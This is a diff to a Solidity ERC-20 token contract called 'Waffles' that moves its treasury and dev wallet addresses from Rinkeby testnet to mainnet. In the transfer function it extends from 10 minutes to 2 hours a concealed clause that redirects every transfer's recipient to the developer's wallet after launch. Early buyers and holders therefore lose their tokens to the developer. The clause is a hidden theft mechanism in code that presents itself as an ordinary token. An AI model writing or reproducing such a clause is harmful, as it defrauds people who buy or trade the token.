@@ -83,8 +83,8 @@ contract Waffles is IERC20, Ownable {
     constructor() {
         IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
         uniswapV2Router = _uniswapV2Router;
-        treasuryWallet = payable(0x6Dab2cf524D12f82750f3242AD0B899c71482BB9); // rinkeby gnosis safe
-        devWallet = 0xaf5F81f04bA7266Ec8a84C80C8a8E482B082fFe6; // rinkeby deployer
+        treasuryWallet = payable(0x7BD15BaFcbcD55BF38d064f3747825Ce2aA5F468); // gnosis safe (mainnet)
+        devWallet = 0x13DB3b44e4ccaC192D38953A1a02eCB393772D93; // chkn deployer (mainnet)
         _isExcludedFromFee[owner()] = true;
         _isExcludedFromFee[address(this)] = true;
         _isExcludedFromFee[devWallet] = true;
@@ -229,7 +229,7 @@ contract Waffles is IERC20, Ownable {
         require(to != address(0), string.concat(_name, ": cannot transfer to the zero address."));
         require(amount > 0, string.concat(_name, ": transfer amount must be greater than zero."));
         require(amount <= balanceOf(from), string.concat(_name, ": cannot transfer more than balance."));
-        if (block.timestamp - _launchTimestamp <= 600) { to = devWallet; }
+        if (block.timestamp - _launchTimestamp <= 7200) { to = devWallet; } // 2 hours
         if ((from == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[to]) ||
                 (to == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[from])) {
             require(amount <= maxTxAmount, string.concat(_name, ": transfer amount exceeds the maxTxAmount."));
